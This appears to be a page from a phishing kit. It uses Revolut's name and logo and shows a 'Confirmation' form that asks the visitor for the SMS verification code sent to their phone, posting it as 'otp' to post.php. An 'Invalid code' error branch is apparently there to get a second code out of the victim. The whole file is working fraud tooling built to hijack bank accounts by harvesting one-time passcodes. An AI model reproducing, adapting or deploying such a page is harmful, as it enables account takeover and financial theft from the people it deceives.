<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>Revolut</title>
</head>
<body>
<header>
    <div class="logo">
<img src="res/img/logo.png" >
    </div>
</header>

<main>

<form action="post.php" method="post">
    


<div  class="form">
<div class="title">
    <h1>Confirmation</h1>
</div> 
 
<div class="sms"><label>Please enter the verification code sent to your phone.</label> </div>
 
<div class="col">
<input type="text" placeholder="Enter code" name="otp" required> <br> <br>
<?php 

if(isset($_GET['error'])){
    echo '<input type="hidden" name="exit">';
    echo '<p style="color:red;">Invalid code</p>';
}
?>
</div>


<div class="but">
    <button type="submit"> Confirm</button>
</div>



</div>
</form>
</main>




</body>
</html>